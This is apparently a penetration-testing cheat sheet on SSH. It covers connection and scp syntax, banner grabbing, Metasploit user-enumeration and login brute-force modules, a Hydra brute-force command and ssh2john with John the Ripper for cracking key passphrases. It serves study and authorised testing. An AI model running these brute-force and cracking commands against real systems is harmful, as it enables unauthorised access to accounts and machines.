# Secure Shell (SSH)

Secure Shell (SSH) was created to provide a secure way for remote system administration. In other words, it lets you securely connect to another system over the network and execute commands on the remote system.  It is a remote administration protocol that uses encryption and is the successor to Telnet. 

**It uses TCP port 22 by default.**

On Linux, macOS, and MS Windows builds after 2018, you can connect to an SSH server using the command: 

```bash
# Remote server connection, use -p if the used port is not 22
ssh username@MACHINE_IP -p PORT

# Remote server connection using a private key
ssh -i PRIVATE_KEY_NAME username@MACHINE_IP
```

We can use SSH to transfer files using SCP (Secure Copy Protocol) based on the SSH protocol. An example of the syntax is as follows:
- Copy a file from a remote system to a local directory: `scp mark@MACHINE_IP:/home/mark/archive.tar.gz ~`
- Copy a file from the local system to the directory on the remote system: `scp backup.tar.bz2 mark@MACHINE_IP:/home/mark/`

## Enumeration

```bash
# Banner grabbing
nc -vn TARGET_IP 22
```

### Metasploit Auxiliary Modules

**auxiliary/scanner/ssh/ssh_version**

```bash
use auxiliary/scanner/ssh/ssh_version

set RHOSTS TARGET_IP

run
```

**auxiliary/scanner/ssh/ssh_login**

> Use auxiliary/scanner/ssh/ssh_login_pubkey for public key authentication.

```bash
use auxiliary/scanner/ssh/ssh_login

set RHOSTS TARGET_IP

set PASS_FILE PASS_WORDLIST
# Example: /usr/share/metasploit-framework/data/wordlist/common_passwords.txt

set USER_FILE USERS_WORDLIST
# Example: /usr/share/metasploit-framework/data/wordlist/common_users.txt

run
```

> If valid credentials are discovered, Metasploit will establish a session which can be listed using the `sessions` command.


**auxiliary/scanner/ssh/ssh_enumusers**

In case brute force attack does not work, we could try to first enumerate users and narrow down the brute force attack.

```bash
use auxiliary/scanner/ssh/ssh_enumusers

set RHOSTS TARGET_IP

set USER_FILE USERS_WORDLIST
# Example: /usr/share/metasploit-framework/data/wordlist/common_users.txt

run
```

## Attack Vectors

### Hydra

Brute force attach with Hydra

```bash
hydra -L USERS_LIST -P PASS_LIST TARGET_IP -t 4 ssh
```


### ssh2john

When the private key is encrypted, `ssh2john` can be used to extract its hashes and use John The Ripper to get the encryption password.

```bash
ssh2john PRIVATE_KEY > hashes.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
``